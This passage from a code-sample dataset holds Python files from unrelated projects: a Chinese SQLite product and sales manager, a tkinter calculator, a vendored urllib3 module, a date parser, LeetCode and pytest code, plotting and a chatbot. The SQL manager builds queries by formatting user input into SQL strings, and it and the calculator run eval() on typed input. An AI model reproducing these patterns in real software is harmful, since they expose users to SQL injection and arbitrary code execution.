print(\"\u67e5\u7121\u6b64\u54c1\u865f:{}\".format(No))\r\n    return\r\n Cname=input(\"\u54c1\u540d\uff1a\")\r\n Credits=input(\"\u5b9a\u50f9\uff1a\")\r\n SQLcmd=\"UPDATE \u7522\u54c1\u8868 SET \u54c1\u540d='{}',\u5b9a\u50f9='{}' Where \u54c1\u865f='{}'\".format(Cname,Credits,No)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u66f4\u65b0\u7522\u54c1\u8a18\u9304\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Delete_Product():  #\u522a\u9664\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)==None:\r\n    print(\"\u67e5\u7121\u6b64\u54c1\u865f:{}\".format(No))\r\n    return\r\n SQLcmd=\"Delete From \u7522\u54c1\u8868 WHERE \u54c1\u865f='{}'\".format(No)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u522a\u9664\u8a18\u9304\u6210\u529f\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Query_Product():  #\u67e5\u8a62\u7522\u54c1\u8a18\u9304\r\n SQLcmd=\"select * from \u7522\u54c1\u8868\"\r\n Record=conn.execute(SQLcmd)\r\n listProduct=list(Record.fetchall())\r\n print(\"\u54c1\u865f    \u54c1\u540d    \u5b9a\u50f9\")\r\n for row in listProduct:\r\n    for col in row:\r\n        print(col, end=\"   \")\r\n    print()\r\n Record.close()\r\n Product_Manager() #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n#\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Sales_Selection(): #\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n print(\"===\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u52a0\u8cfc\u7a0b\u8a18\u9304\")\r\n print(\"2.\u9000\u8ca8\u7a0b\u8a18\u9304\")\r\n print(\"3.\u67e5\u8a62\u8cfc\u8cb7\u8a18\u9304\")\r\n print(\"4.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Sales()  #\u52a0\u8cfc\u7a0b\u8a18\u9304\r\n elif n==2:\r\n   Delete_Sales()  #\u9000\u8ca8\u7a0b\u8a18\u9304  \r\n elif n==3:\r\n   Query_Sales()   #\u67e5\u8a62\u8cfc\u8cb7\u8a18\u9304\r\n elif n==4:\r\n    Main_Menu()     #\u56de\u4e3b\u756b\u9762\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\ndef CheckSales_NO(Sid,No):  \r\n  SQLcmd=\"select * from \u8cfc\u8cb7\u8868 where \u7de8\u865f='{}' and \u54c1\u865f='{}'\".format(Sid,No)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\ndef Insert_Sales():  #\u52a0\u8cfc\u7a0b\u8a18\u9304\r\n# Query_Produc",
    "from tkinter import *\r\nimport math\r\n\r\nclass Calculator:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"Calculator\")\r\n        self.root.geometry(\"300x400\")\r\n\r\n        self.equation = StringVar()\r\n\r\n        self.display = Entry(root, textvariable=self.equation, font=('Arial', 20))\r\n        self.display.grid(row=0, column=0, columnspan=4, padx=10, pady=10, sticky=\"nsew\")\r\n\r\n        self.buttons = [\r\n            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('+', 1, 3),\r\n            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('-', 2, 3),\r\n            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('*', 3, 3),\r\n            ('0', 4, 0), ('.', 4, 1), ('/', 4, 2), ('%', 4, 3)\r\n        ]\r\n\r\n        self.create_buttons()\r\n\r\n    def create_buttons(self):\r\n        for (text, row, col) in self.buttons:\r\n            button = Button(self.root, text=text, font=('Arial', 16), padx=20, pady=20,\r\n                            command=lambda t=text: self.on_button_click(t))\r\n            button.grid(row=row, column=col, sticky=\"nsew\")\r\n        \r\n\r\n        Button(self.root, text='C', font=('Arial', 16), padx=20, pady=20, command=self.clear).grid(row=5, column=0, sticky=\"nsew\")\r\n        Button(self.root, text='=', font=('Arial', 16), padx=20, pady=20, command=self.calculate).grid(row=5, column=1, columnspan=2, sticky=\"nsew\")\r\n        Button(self.root, text='\u2190', font=('Arial', 16), padx=20, pady=20, command=self.delete_last).grid(row=5, column=3, sticky=\"nsew\")\r\n        Button(self.root, text='sin', font=('Arial', 16), padx=20, pady=20, command=lambda: self.trig_function('sin')).grid(row=6, column=0, sticky=\"nsew\")\r\n        Button(self.root, text='cos', font=('Arial', 16), padx=20, pady=20, command=lambda: self.trig_function('cos')).grid(row=6, column=1, sticky=\"nsew\")\r\n        Button(self.root, text='tan', font=('Arial', 16), padx=20, pady=20, command=lambda: self.trig_function('tan')).grid(row=6, column=2, sticky=\"nsew\")\r\n        Button(self.root, text='\u221a', font=('Arial', 16), padx=20, pady=20, command=self.square_root).grid(row=6, column=3, sticky=\"nsew\")\r\n\r\n    def on_button_click(self, char):\r\n        current_equation = self.equation.get()\r\n        new_equation = current_equation + str(char)\r\n        self.equation.set(new_equation)\r\n\r\n    def clear(self):\r\n        self.equation.set(\"\")\r\n\r\n    def delete_last(self):\r\n        current_equation = self.equation.get()\r\n        new_equation = current_equation[:-1]\r\n        self.equation.set(new_equation)\r\n\r\n    def calculate(self):\r\n        try:\r\n            expression = self.equation.get()\r\n            result = eval(expression)\r\n            self.equation.set(result)\r\n        except Exception as e:\r\n            self.equation.set(\"Error\")\r\n\r\n    def trig_function(self, func):\r\n        try:\r\n            value = float(self.equation.get())\r\n            if func == 'sin':\r\n                result = math.sin(math.radians(value))\r\n            elif func == 'cos':\r\n                result = math.cos(math.radians(value))\r\n            elif func == 'tan':\r\n                result = math.tan(math.radians(value))\r\n            self.equation.set(result)\r\n        except Exception as e:\r\n            self.equation.set(\"Error\")\r\n\r\n    def square_root(self):\r\n        try:\r\n            value = float(self.equation.get())\r\n            if value >= 0:\r\n                result = math.sqrt(value)\r\n                self.equation.set(result)\r\n            else:\r\n                self.equation.set(\"Error\")\r\n        except Exception as e:\r\n            self.equation.set(\"Error\")\r\n\r\n\r\nroot = Tk()\r\napp = Calculator(root)\r\nroot.mainloop()\r\n",
    "\"\"\"\nThis module provides a pool manager that uses Google App Engine's\n`URLFetch Service <https://cloud.google.com/appengine/docs/python/urlfetch>`_.\n\nExample usage::\n\n    from pip._vendor.urllib3 import PoolManager\n    from pip._vendor.urllib3.contrib.appengine import AppEngineManager, is_appengine_sandbox\n\n    if is_appengine_sandbox():\n        # AppEngineManager uses AppEngine's URLFetch API behind the scenes\n        http = AppEngineManager()\n    else:\n        # PoolManager uses a socket-level API behind the scenes\n        http = PoolManager()\n\n    r = http.request('GET', 'https://google.com/')\n\nThere are `limitations <https://cloud.google.com/appengine/docs/python/\\\nurlfetch/#Python_Quotas_and_limits>`_ to the URLFetch service and it may not be\nthe best choice for your application. There are three options for using\nurllib3 on Google App Engine:\n\n1. You can use :class:`AppEngineManager` with URLFetch. URLFetch is\n   cost-effective in many circumstances as long as your usage is within the\n   limitations.\n2. You can use a normal :class:`~urllib3.PoolManager` by enabling sockets.\n   Sockets also have `limitations and restrictions\n   <https://cloud.google.com/appengine/docs/python/sockets/\\\n   #limitations-and-restrictions>`_ and have a lower free quota than URLFetch.\n   To use sockets, be sure to specify the following in your ``app.yaml``::\n\n        env_variables:\n            GAE_USE_SOCKETS_HTTPLIB : 'true'\n\n3. If you are using `App Engine Flexible\n<https://cloud.google.com/appengine/docs/flexible/>`_, you can use the standard\n:class:`PoolManager` without any configuration or special environment variables.\n\"\"\"\n\nfrom __future__ import absolute_import\n\nimport io\nimport logging\nimport warnings\n\nfrom ..exceptions import (\n    HTTPError,\n    HTTPWarning,\n    MaxRetryError,\n    ProtocolError,\n    SSLError,\n    TimeoutError,\n)\nfrom ..packages.six.moves.urllib.parse import urljoin\nfrom ..request import RequestMethods\nfrom ..response import HTTPResponse\nfrom ..util.retry import Retry\nfrom ..util.timeout import Timeout\nfrom . import _appengine_environ\n\ntry:\n    from google.appengine.api import urlfetch\nexcept ImportError:\n    urlfetch = None\n\n\nlog = logging.getLogger(__name__)\n\n\nclass AppEnginePlatformWarning(HTTPWarning):\n    pass\n\n\nclass AppEnginePlatformError(HTTPError):\n    pass\n\n\nclass AppEngineManager(RequestMethods):\n    \"\"\"\n    Connection manager for Google App Engine sandbox applications.\n\n    This manager uses the URLFetch service directly instead of using the\n    emulated httplib, and is subject to URLFetch limitations as described in\n    the App Engine documentation `here\n    <https://cloud.google.com/appengine/docs/python/urlfetch>`_.\n\n    Notably it will raise an :class:`AppEnginePlatformError` if:\n        * URLFetch is not available.\n        * If you attempt to use this on App Engine Flexible, as full socket\n          support is available.\n        * If a request size is more than 10 megabytes.\n        * If a response size is more than 32 megabytes.\n        * If you use an unsupported request method such as OPTIONS.\n\n    Beyond those cases, it will raise normal urllib3 errors.\n    \"\"\"\n\n    def __init__(\n        self,\n        headers=None,\n        retries=None,\n        validate_certificate=True,\n        urlfetch_retries=True,\n    ):\n        if not urlfetch:\n            raise AppEnginePlatformError(\n                \"URLFetch is not available in this environment.\"\n            )\n\n        warnings.warn(\n            \"urllib3 is using URLFetch on Google App Engine sandbox instead \"\n            \"of sockets. To use sockets directly instead of URLFetch see \"\n            \"https://urllib3.readthedocs.io/en/1.26.x/reference/urllib3.contrib.html.\",\n            AppEnginePlatformWarning,\n        )\n\n        RequestMethods.__init__(self, headers)\n        self.validate_certificate = validate_certificate\n        self.urlfetch_retries = urlfetch_retries\n\n        self.retries = retries or Retry.DEFAULT\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        # Return False to re-raise any potential exceptions\n        return False\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        **response_kw\n    ):\n\n        retries = self._get_retries(retries, redirect)\n\n        try:\n            follow_redirects = redirect and retries.redirect != 0 and retries.total\n            response = urlfetch.fetch(\n                url,\n                payload=body,\n                method=method,\n                headers=headers or {},\n                allow_truncated=False,\n                follow_redirects=self.urlfetch_retries and follow_redirects,\n                deadline=self._get_absolute_timeout(timeout),\n                validate_certificate=self.validate_certificate,\n            )\n        except urlfetch.DeadlineExceededError as e:\n            raise Timeou",
    "import re\nfrom datetime import datetime\nfrom dateutil.parser import parse\n\n\ndef parse_exam_data(line, default_year=datetime.now().year):\n    \"\"\"\u89e3\u6790\u4e0d\u540c\u683c\u5f0f\u7684\u8003\u8bd5\u4fe1\u606f\uff0c\u8fd4\u56de\u8003\u8bd5\u5f00\u59cb\u65f6\u95f4\u548c\u539f\u59cb\u884c\u5185\u5bb9\u7684\u5143\u7ec4\u3002\"\"\"\n    datetime_patterns = [\n        r'(\\d{4})\u5e74[-/](\\d{2})\u6708[-/](\\d{2})\u65e5[-/](\\d{2})\u65f6',\n        r'(\\d{4})[-/.](\\d{2})[-/.](\\d{2})[ T](\\d{2}):(\\d{2})',\n        r'(\\d{4})[-/.](\\d{2})[-/.](\\d{2})',\n        r'(\\d{2})[-/.](\\d{2})',\n        r'(\\d{1,2}):(\\d{2}) (AM|PM) (\\d{1,2})[-/.](\\d{2})[-/.](\\d{4})',\n        r'(\\d{2})(\\d{2})',\n        r'(\\d{4})(\\d{2})(\\d{2})'  # YYYYMMDD\u683c\u5f0f\n    ]\n\n    # \u9884\u7f16\u8bd1\u6b63\u5219\u8868\u8fbe\u5f0f\u4ee5\u63d0\u9ad8\u6027\u80fd\n    compiled_patterns = [re.compile(pattern) for pattern in datetime_patterns]\n\n    for pattern in compiled_patterns:\n        match = pattern.search(line)\n        if match:\n            groups = match.groups()\n            try:\n                date_str = construct_date_str(groups, pattern, default_year)\n                start_time = parse(date_str)\n                formatted_date = start_time.strftime('%Y-%m-%d %H:%M:%S')\n                revised_line = f\"{formatted_date} {line.strip()}\\n\"\n                return start_time, revised_line\n            except (ValueError, IndexError):\n                continue  # \u5728\u89e3\u6790\u5931\u8d25\u65f6\u7ee7\u7eed\u5c1d\u8bd5\u5176\u4ed6\u683c\u5f0f\n    return None, line\n\n\ndef construct_date_str(groups, pattern, default_year):\n    \"\"\"\u6839\u636e\u6355\u83b7\u7684\u7ec4\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\u6784\u5efa\u65e5\u671f\u5b57\u7b26\u4e32\u3002\"\"\"\n    if '\u5e74' in pattern.pattern or any(x in pattern.pattern for x in ['/', '-', '.']):\n        hour = groups[3] if len(groups) > 3 else '00'\n        return f\"{groups[0]}-{groups[1]}-{groups[2]} {hour}:00:00\"\n    elif 'AM' in pattern.pattern or 'PM' in pattern.pattern:\n        return f\"{groups[5]}-{groups[3]}-{groups[4]} {groups[0]}:{groups[1]} {groups[2]}\"\n    elif len(groups) == 2:\n        return f\"{default_year}-{groups[0]}-{groups[1]} 00:00:00\"\n    elif len(groups) == 3:\n        return f\"{groups[0]}-{groups[1]}-{groups[2]} 00:00:00\"\n    return groups[0]\n\n\ndef read_and_sort_exams(filename):\n    \"\"\" \u8bfb\u53d6\u548c\u6392\u5e8f\u8003\u8bd5\u6570\u636e\u6587\u4ef6 \"\"\"\n    with open(filename, 'r', encoding='utf-8') as file:\n        exams = [parse_exam_data(line) for line in file if line.strip()]\n        exams = [exam for exam in exams if exam[0] is not None]\n        exams.sort(key=lambda x: x[0])  # \u6839\u636e\u65e5\u671f\u6392\u5e8f\n    return [exam[1] for exam in exams]\n\n\ndef write_sorted_exams(filename, sorted_exams):\n    \"\"\" \u5c06\u6392\u5e8f\u540e\u7684\u8003\u8bd5\u4fe1\u606f\u5199\u56de\u6587\u4ef6 \"\"\"\n    with open(filename, 'w', encoding='utf-8') as file:\n        file.writelines(sorted_exams)\n\n\n# \u793a\u4f8b\u7528\u6cd5\uff1a\nsource_filename = 'ori_exam_data.txt'\nfilename = 'exam_data.txt'\n\n# \u8bfb\u53d6\u548c\u6392\u5e8f\u8003\u8bd5\u4fe1\u606f\nsorted_exams = read_and_sort_exams(source_filename)\n\n# \u5199\u56de\u6392\u5e8f\u540e\u7684\u8003\u8bd5\u4fe1\u606f\u5230\u6587\u4ef6\nwrite_sorted_exams(filename, sorted_exams)\n",
    "# 1. Two Sum\n# Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\n\n# You may assume that each input would have exactly one solution, and you may not use the same element twice.\n\n# You can return the answer in any order.\n# Example 1:\n\n# Input: nums = [2,7,11,15], target = 9\n# Output: [0,1]\n# Explanation: Because nums[0] + nums[1] == 9, we return [0, 1].\n# Example 2:\n\n# Input: nums = [3,2,4], target = 6\n# Output: [1,2]\n# Example 3:\n\n# Input: nums = [3,3], target = 6\n# Output: [0,1]\n \n\n# Constraints:\n\n# 2 <= nums.length <= 104\n# -109 <= nums[i] <= 109\n# -109 <= target <= 109\n# Only one valid answer exists.\n \n\n# Follow-up: Can you come up with an algorithm that is less than O(n2) time complexity?\n\n\n################################################################################################################################\nclass Solution(object):\n    def twoSum(self, nums, target):\n        \"\"\"\n        :type nums: List[int]\n        :type target: int\n        :rtype: List[int]\n        \"\"\"\n        #FirstAttempt\n        # for i1,e1 in enumerate(nums):\n        #     for i2,e2 in enumerate(nums):\n        #         if i1==i2: continue\n        #         elif e1+e2==target: return [i1,i2]\n        #Accepted\n        #Runtime \u2248 4469\n        #Memory \u2248 12.50\n\n        #SecondAttempt\n        i1=0\n        while 1:\n            i2=i1+1\n            for e in nums[1:]:\n                if nums[0]+e == target: return [i1,i2]\n                i2+=1\n            i1+=1\n            del nums[0]\n        #Accepted\n        #Runtime \u2248 2183\n        #Memory \u2248 12.45\n        \n        #ThirdAttempt\n        # i1=0\n        # while 1:\n        #     i2=i1+1\n        #     for e in nums[i1+1:]:\n        #         if nums[i1]+e == target: return [i1,i2]\n        #         i2+=1\n        #     i1+=1\n        #Accepted \n        #Runtime \u2248 2191\n        #Memory \u2248 12.38\n        \n        #FourthAttempt (I was helped)\n        # i=0\n        # for e in nums:\n        #     if target-e in nums[1+i:]: \n        #         return [i,nums[1+i:].index(target-e)+i+1]\n        #     i+=1\n        #Accepted \n        #Runtime \u2248 280ms\n        #Memory \u2248 12.24\n        \n        #FiveAttempt (Not mine)\n        # h={}\n        # for i,e in enumerate(nums):\n        #     if target-e in h: return [h[target-e],i]\n        #     else:\n        #         h[e]=i",
    "from project import air_quality, get_city_lat_long, current_weather\nimport pytest\n\n\ndef main():\n  test_get_city_lat_long()\n  test_air_quality()\n  test_current_weather()\n\n\ndef test_get_city_lat_long():\n  assert get_city_lat_long('pune') == (\n      18.521428, 73.8544541, \"IN\", \"Maharashtra\", \"Pune\")\n  assert get_city_lat_long('lonDon') == (\n      51.5073219, -0.1276474, \"GB\", \"England\", \"London\")\n  assert get_city_lat_long('New York') == (\n      40.7127281, -74.0060152, \"US\", \"New York\", \"New York County\")\n  assert get_city_lat_long('Delhi') == (\n      28.6517178, 77.2219388, \"IN\", \"Delhi\", \"Delhi\")\n\n\n\n@pytest.mark.parametrize('city, tuple_data', [\n    ('pune', (18.521428, 73.8544541, \"IN\", \"Maharashtra\", \"Pune\")),\n    ('lonDon', (51.5073219, -0.1276474, \"GB\", \"England\", \"London\")),\n    ('New York', (40.7127281, -74.0060152, \"US\", \"New York\", \"New York County\")),\n    ('Delhi  ', (28.6517178, 77.2219388, \"IN\", \"Delhi\", \"Delhi\")),\n  ], ids=[\"Pune\", \"London\", \"New York\", \"Delhi\"])\ndef test_get_city_lat_long(city, tuple_data):\n  assert get_city_lat_long(city) == tuple_data\n\n\ndef test_air_quality():\n  assert air_quality(\"sbjsbhjbjd\") == (\"\", \"\")\n\n\ndef test_current_weather():\n  assert current_weather('svnbdvngdenb as') == \"\\n City not found \u274c; Please, enter correct city name!\"\n\n\n\nif __name__ == \"__main__\":\n  main()\n",
    "import matplotlib.pyplot as plt\nimport numpy as np\nimport os\nfrom scipy.stats import norm\nimport seaborn as sns\n\nPLOTS_DIR = \"./plots\"\ntime_to_wait = 3\n\n\ndef plot_price_vs_mileage(mileage, price):\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n\n    plt.figure(figsize=(10, 7))\n    plt.plot(mileage, price, 'o', label=\"Dataset\")\n    plt.xlabel(\"Mileage\")\n    plt.ylabel(\"Price\")\n    plt.title(\"Data price of car with mileage\")\n    plt.legend()\n    plt.grid(True)\n    plt.tight_layout()\n    plt.show(block=False)\n    plt.pause(time_to_wait)\n\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n    save_path = os.path.join(PLOTS_DIR, \"01_plot_price_vs_mileage.png\")\n    plt.savefig(save_path)\n    print(\"\\n\u26aa\ufe0f Plot saved as: {}\\n\".format(save_path))\n    input(\"\\nPress Enter to continue...\\n\")\n    plt.close()\n\n\ndef plot_regression_animation(mileage, price, result):\n    plt.figure(figsize=(10, 7))\n\n    for i in range(0, len(result), 10):\n        plt.clf()\n        theta0 = result['theta0'].iloc[i]\n        theta1 = result['theta1'].iloc[i]\n        plt.scatter(mileage, price, color='blue')\n        plt.plot(mileage, theta0 + theta1 * mileage, color='red', linewidth=3)\n        plt.xlabel('Mileage (km)')\n        plt.ylabel('Price (\u20ac)')\n        plt.title('Linear Regression Animation (Iteration {}): '\n                  'Theta0 = {:.4f} // Theta1 = {:.4f}'.\n                  format(i+1, theta0, theta1))\n        plt.grid(True)\n        if i == 0:\n            plt.pause(time_to_wait)\n        if i < 400:\n            pause_duration = 0.5 - (0.49 / 400) * i\n        else:\n            pause_duration = 0.01\n        plt.pause(pause_duration)\n    plt.close()\n    input(\"\\nPress Enter to continue...\\n\")\n    plt.close()\n\n\ndef plot_price_vs_mileage_with_linear_reg(mileage, price, theta0, theta1):\n    plt.figure(figsize=(10, 7))\n    x = np.linspace(min(mileage), max(mileage), 2)\n    plt.plot(mileage, price, 'o', label=\"Dataset\")\n    plt.plot(x, theta0 + theta1 * x, 'green', label=\"Linear Regression\",\n             linewidth=3)\n    plt.xlabel(\"Mileage\")\n    plt.ylabel(\"Price\")\n    plt.title(\"Price evolution of car with mileage (Linear Regression)\")\n    plt.legend()\n    plt.grid(True)\n    plt.tight_layout()\n    plt.show(block=False)\n    plt.pause(time_to_wait)\n\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n    save_path = os.path.join(PLOTS_DIR,\n                             \"02_plot_price_vs_mileage_with_linear_reg.png\")\n    plt.savefig(save_path)\n    print(\"\\n\u26aa\ufe0f Plot saved as: {}\\n\".format(save_path))\n    input(\"\\nPress Enter to continue...\\n\")\n    plt.close()\n\n\ndef plot_cost_evolution(result):\n    plt.figure(figsize=(10, 7))\n    x = range(len(result))\n    plt.plot(x, result.loc[:, 'Cost'], 'green', label=\"Mean Square Error\",\n             linewidth=3)\n    plt.xlabel(\"Algo iterations\")\n    plt.ylabel(\"Mean Square Error\")\n    plt.title(\"Evolution of 'MSE' with gradient descent iterations\")\n    plt.legend()\n    plt.grid(True)\n    plt.tight_layout()\n    plt.show(block=False)\n    plt.pause(time_to_wait)\n\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n    save_path = os.path.join(PLOTS_DIR, \"03_plot_MSE_evolution.png\")\n    plt.savefig(save_path)\n    print(\"\\n\u26aa\ufe0f Plot saved as: {}\\n\".format(save_path))\n    input(\"\\nPress Enter to continue...\\n\")\n    plt.close()\n\n\ndef plot_theta0_and_theta1(result):\n    plt.figure(figsize=(15, 7))\n\n    plt.subplot(1, 2, 1)\n    x = range(1, len(result))\n    plt.plot(x, result.loc[1:, 'theta0'], 'green', label=\"theta0\", linewidth=3)\n    plt.xlabel(\"Algorithm iterations\")\n    plt.ylabel(\"theta0\")\n    plt.title(\"Evolution of 'theta0' with gradient descent iterations\")\n    plt.legend()\n    plt.grid(True)\n\n    plt.subplot(1, 2, 2)\n    plt.plot(x, result.loc[1:, 'theta1'], 'blue', label=\"theta1\", linewidth=3)\n    plt.xlabel(\"Algorithm iterations\")\n    plt.ylabel(\"theta1\")\n    plt.title(\"Evolution of 'theta1' with gradient descent iterations\")\n    plt.legend()\n    plt.grid(True)\n\n    plt.tight_layout()\n    plt.show(block=False)\n    plt.pause(time_to_wait)\n\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n    save_path = os.path.join(PLOTS_DIR, \"04_plot_theta0_&_theta1.png\")\n    plt.savefig(save_path)\n    print(\"\\n\u26aa\ufe0f Plot saved as: {}\\n\".format(save_path))\n    input(\"\\nPress Enter to continue...\\n\")\n    plt.close()\n\n\ndef plot_normal_distribution(errors):\n    mean_error = np.mean(errors)\n    std_error = np.std(errors)\n\n    x = np.linspace(mean_error - 3*std_error, mean_error + 3*std_error, 100)\n    y = norm.pdf(x, mean_error, std_error)\n\n    plt.figure(figsize=(10, 7))\n    sns.kdeplot(errors, color='g', label='Errors Distribution',\n                linewidth=3)\n    plt.plot(x, y, label='Normal Distribution')\n    plt.title('Errors vs. Normal Distribution')\n    plt.xlabel('Errors')\n    plt.ylabel('Density')\n    plt.legend()\n    plt.grid(True)\n    plt.tight_layout()\n    plt.show(block=False)\n    plt.pause(time_to_wait)\n\n    os.makedirs(PLOTS_DIR, exist_ok=True)\n    save_path = os.path.join(PLOTS_DIR, \"05_plot_errors.png\")\n    plt.savefig(save_path)\n    print(\"\\n\u26aa\ufe0f Plot",
    "# Copyright Lightning AI. Licensed under the Apache License 2.0, see LICENSE file.\n\nimport os\nimport shutil\nfrom contextlib import redirect_stdout\nfrom io import StringIO\nfrom pathlib import Path\nfrom unittest import mock\n\nimport pytest\nimport torch\nimport yaml\n\nfrom litgpt.lora import GPT as LoRAGPT\nfrom litgpt.lora import lora_filter\nfrom litgpt.model import GPT\nfrom litgpt.scripts.merge_lora import load_lora_metadata, merge_lora\n\n\n@mock.patch.dict(os.environ, {\"LT_ACCELERATOR\": \"cpu\"})\ndef test_merge_lora(tmp_path, fake_checkpoint_dir):\n    pretrained_checkpoint_dir = tmp_path / \"pretrained\"\n    lora_checkpoint_dir = tmp_path / \"lora\"\n    shutil.copytree(fake_checkpoint_dir, pretrained_checkpoint_dir)\n    shutil.copytree(fake_checkpoint_dir, lora_checkpoint_dir)\n    (lora_checkpoint_dir / \"lit_model.pth\").unlink()  # should not already exist\n    shutil.rmtree(tmp_path / \"checkpoints\")\n\n    # Create a fake pretrained checkpoint\n    config = dict(block_size=128, padded_vocab_size=256, n_layer=3, n_head=8, n_embd=16)\n    with open(pretrained_checkpoint_dir / \"model_config.yaml\", \"w\") as fp:\n        yaml.dump(config, fp)\n    base_model = GPT.from_name(\"pythia-14m\", **config)\n    state_dict = base_model.state_dict()\n    assert len(state_dict) == 40\n    torch.save(state_dict, pretrained_checkpoint_dir / \"lit_model.pth\")\n\n    # Create a fake LoRA checkpoint\n    lora_kwargs = dict(lora_r=8, lora_alpha=16, lora_dropout=0.05, lora_query=True, lora_value=True)\n    lora_model = LoRAGPT.from_name(\"pythia-14m\", **config, **lora_kwargs)\n    state_dict = {k: v for k, v in lora_model.state_dict().items() if lora_filter(k, v)}\n    assert len(state_dict) == 6\n    torch.save(state_dict, lora_checkpoint_dir / \"lit_model.pth.lora\")\n    hparams = dict(checkpoint_dir=str(pretrained_checkpoint_dir), **lora_kwargs)\n    with open(lora_checkpoint_dir / \"hyperparameters.yaml\", \"w\") as file:\n        yaml.dump(hparams, file)\n    shutil.copyfile(pretrained_checkpoint_dir / \"model_config.yaml\", lora_checkpoint_dir / \"model_config.yaml\")\n\n    assert set(os.listdir(tmp_path)) == {\"lora\", \"pretrained\"}\n    merge_lora(lora_checkpoint_dir)\n    assert set(os.listdir(tmp_path)) == {\"lora\", \"pretrained\"}\n    assert set(os.listdir(lora_checkpoint_dir)) == {\n        \"model_config.yaml\",\n        \"lit_model.pth\",\n        \"lit_model.pth.lora\",\n        \"tokenizer.json\",\n        \"tokenizer_config.json\",\n        \"hyperparameters.yaml\",\n    }\n\n    # Assert that the merged weights can be loaded back into the base model\n    merged = torch.load(lora_checkpoint_dir / \"lit_model.pth\")\n    keys = base_model.load_state_dict(merged, strict=True)\n    assert not keys.missing_keys\n    assert not keys.unexpected_keys\n\n    # Attempt to merge again\n    stdout = StringIO()\n    with redirect_stdout(stdout):\n        merge_lora(lora_checkpoint_dir)\n    assert \"LoRA weights have already been merged\" in stdout.getvalue()\n\n\ndef test_load_lora_metadata(fake_checkpoint_dir):\n    assert not (fake_checkpoint_dir / \"hyperparameters.yaml\").is_file()\n    with pytest.raises(FileNotFoundError, match=\"missing a `hyperparameters.yaml` file\"):\n        load_lora_metadata(fake_checkpoint_dir)\n\n    hparams = dict(precision=\"bf16-mixed\", checkpoint_dir=\"checkpoints/meta-llama/Llama-2-7b\", lora_r=8, lora_alpha=16)\n    with open(fake_checkpoint_dir / \"hyperparameters.yaml\", \"w\") as file:\n        yaml.dump(hparams, file)\n\n    lora_args, pretrained_dir, precision = load_lora_metadata(fake_checkpoint_dir)\n    assert lora_args == dict(lora_r=8, lora_alpha=16)\n    assert pretrained_dir == Path(\"checkpoints/meta-llama/Llama-2-7b\")\n    assert precision == \"bf16-mixed\"\n",
    "import re\r\nimport long_responses as long\r\n\r\n\r\ndef message_probability(user_message, recognised_words, single_response=False, required_words=[]):\r\n    message_certainty = 0\r\n    has_required_words = True\r\n\r\n    # Counts how many words are present in each predefined message\r\n    for word in user_message:\r\n        if word in recognised_words:\r\n            message_certainty += 1\r\n\r\n    # Calculates the percent of recognised words in a user message\r\n    percentage = float(message_certainty) / float(len(recognised_words))\r\n\r\n    # Checks that the required words are in the string\r\n    for word in required_words:\r\n        if word not in user_message:\r\n            has_required_words = False\r\n            break\r\n\r\n    # Must either have the required words, or be a single response\r\n    if has_required_words or single_response:\r\n        return int(percentage * 100)\r\n    else:\r\n        return 0\r\n\r\n\r\ndef check_all_messages(message):\r\n    highest_prob_list = {}\r\n\r\n    # Simplifies response creation / adds it to the dict\r\n    def response(bot_response, list_of_words, single_response=False, required_words=[]):\r\n        nonlocal highest_prob_list\r\n        highest_prob_list[bot_response] = message_probability(message, list_of_words, single_response, required_words)\r\n\r\n    # Responses -------------------------------------------------------------------------------------------------------\r\n    response('Hello!', ['hello', 'hi', 'hey', 'sup', 'heyo'], single_response=True)\r\n    response('See you!', ['bye', 'goodbye'], single_response=True)\r\n    response('I\\'m doing fine, and you?', ['how', 'are', 'you', 'doing'], required_words=['how'])\r\n    response('You\\'re welcome!', ['thank', 'thanks'], single_response=True)\r\n    response('Thank you!', ['i', 'love', 'code', 'palace'], required_words=['code', 'palace'])\r\n\r\n    # Longer responses\r\n    response(long.R_ADVICE, ['give', 'advice'], required_words=['advice'])\r\n    response(long.R_EATING, ['what', 'you', 'eat'], required_words=['you', 'eat'])\r\n\r\n    best_match = max(highest_prob_list, key=highest_prob_list.get)\r\n    # 